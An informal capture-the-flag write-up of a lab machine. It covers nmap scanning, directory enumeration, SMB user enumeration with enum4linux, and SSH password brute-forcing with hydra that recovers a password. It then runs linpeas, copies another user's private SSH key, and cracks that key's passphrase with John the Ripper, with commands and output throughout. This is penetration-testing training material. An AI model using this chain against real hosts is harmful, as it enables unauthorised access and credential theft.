...
Task2:	 Find the service exposed by system

1. nmap -sC -sV  -oN nmap/initial 10.10.76.129

	Result:

port open 80,445,22,139

Task3:What is the name of the hidden directory on the web server(enter name without /)?

GOBUSTER:
usage: gobuster -w /Desktop/gobuster.txt -u 10.10.76.129

DIRSEARCH
Tool used to find directories of an ipaddress and url
Usage: dirsearch [-u|–url] target [-e|–extensions] extensions [options]
example: sudo dirsearch -u http://10.10.76.129/ -e php

RESULT:
|. _ _ _ _ _ | v0.3.9
(||| ) (/(|| (| )
Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6027
Error Log: /root/.dirsearch/logs/errors-20-05-23_09-48-01.log
Target: http://10.10.76.129/
[09:48:02] Starting:
[09:48:10] 403 - 298B - /.ht_wsr.txt
[09:48:10] 403 - 291B - /.hta
[09:48:10] 403 - 300B - /.htaccess-dev
[09:48:10] 403 - 302B - /.htaccess-local
[09:48:10] 403 - 300B - /.htaccess.BAK
[09:48:10] 403 - 300B - /.htaccess.old
[09:48:10] 403 - 301B - /.htaccess.orig
[09:48:10] 403 - 301B - /.htaccess.bak1
[09:48:10] 403 - 303B - /.htaccess.sample
[09:48:10] 403 - 302B - /.htaccess-marco
[09:48:10] 403 - 301B - /.htaccess.save
[09:48:10] 403 - 300B - /.htaccess.txt
[09:48:10] 403 - 302B - /.htaccess_extra
[09:48:10] 403 - 299B - /.htaccess_sc
[09:48:10] 403 - 301B - /.htaccess_orig
[09:48:10] 403 - 299B - /.htaccessOLD
[09:48:10] 403 - 299B - /.htaccessBAK
[09:48:10] 403 - 300B - /.htaccessOLD2
[09:48:10] 403 - 295B - /.htgroup
[09:48:11] 403 - 300B - /.htpasswd-old
[09:48:11] 403 - 301B - /.htpasswd_test
[09:48:11] 403 - 295B - /.htusers
[09:48:11] 403 - 297B - /.htaccess~
[09:48:11] 403 - 297B - /.htpasswds
[09:49:53] 200 - 1KB - /development/                 ←this is the one we needed
[09:50:16] 200 - 158B - /index.html
[09:51:06] 403 - 300B - /server-status
[09:51:06] 403 - 301B - /server-status/
Task Completed
Result:
development is the one we needed


Task4. Use brute-forcing to find the username & password

for username:

enum4linux
usage : sudo enum4linux -a 10.10.76.129
result:
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 23 11:07:06 2020
==========================
| Target Information |
Target … 10.10.76.129
...
====================================================
| Enumerating Workgroup/Domain on 10.10.76.129 |
[+] Got domain/workgroup name: WORKGROUP
============================================
| Nbtstat Information for 10.10.76.129 |
Looking up status of 10.10.76.129
BASIC2 <00> - B 
BASIC2 <03> - B 
BASIC2 <20> - B 
…MSBROWSE. <01> -  
...
=====================================
| Session Check on 10.10.76.129 |
[+] Server 10.10.76.129 allows sessions using username ‘’, password ‘’
===========================================
| Getting domain SID for 10.10.76.129 |
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can’t determine if host is part of domain or part of a workgroup
======================================
| OS information on 10.10.76.129 |
Use of uninitialized value $os_info in concatenation (.) or string at /usr/bin/enum4linux line 464.
[+] Got OS info for 10.10.76.129 from smbclient:
[+] Got OS info for 10.10.76.129 from srvinfo:
BASIC2 Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
platform_id : 500
os version : 6.1
server type : 0x809a03
=============================
| Users on 10.10.76.129 |
...
=========================================
| Share Enumeration on 10.10.76.129 |
    Sharename       Type      Comment
    ---------       ----      -------
    Anonymous       Disk      
    IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled – no workgroup available
[+] Attempting to map shares on 10.10.76.129
//10.10.76.129/Anonymous Mapping: OK, Listing: OK
//10.10.76.129/IPC$ [E] Can’t understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing *
====================================================
| Password Policy Information for 10.10.76.129 |
[+] Attaching to 10.10.76.129 using a NULL share
...
=======================================================================
| Users on 10.10.76.129 via RID cycling (RIDS: 500-550,1000-1050) |
...
=============================================
| Getting printer info for 10.10.76.129 |
No printers returned.
enum4linux complete on Sat May 23 11:20:13 2020

CONCLUSION:
username are kay and jan

For password:

Password bruiteforce with hydra
USAGE:
hydra -l username -P location-to-wordlist(rockyou.txt) ssh://ipadddress
Example:
hydra -l jan -P rockyou.txt ssh://10.10.76.129
Hydra v9.0 © 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-23 11:36:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.76.129:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 14344225 to do in 1335:36h, 16 active
[STATUS] 114.00 tries/min, 342 tries in 00:03h, 14344062 to do in 2097:06h, 16 active
[22][ssh] host: 10.10.76.129 login: jan password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-23 11:43:01
CONCLUSION:
username: jan
password: armando

Task5:What is the final password you obtain?



After you get into ssh server with username and password linpeas helps to find server details
       ssh jan@10.10.76.129
       password: armando
       
       after looking for while we found kay directory

Steps:
    1. Download linpeas to local computer
    2. uploading linpeas files to ssh server from local computer
scp location-to-linpeas.sh username@ipaddress:/dev/shm (<-location)
    3. Though ssh server find details

now from jan server we logged in 

we chmod the linpeas file we uploaded from local computer 
...
now we found  private rsa key in linpeas result which helps us  login into kay ssh

→ cd .ssh
→ cat id_rsa 

 and  we save the private keu to local machine kay_id_rsa
→ nano kay_id_rsa
→ chmod 600 kay_id_rsa     ``` only available for us```

now we try log into kay id 
→ ssh kay@10.10.76.129
but it is passsword protected

so We use john the ripper

1. python2 /usr/bin/ssh2 john kay_id_rsa  > john12.txt
2. john john12.txt –wordlist=rockyou.txt

now we again try login into kay id

ssh -i kay_id_rsa kay@10.10.76.129

then we see passwordfile pass.bak
nano pass.bak
And password found 
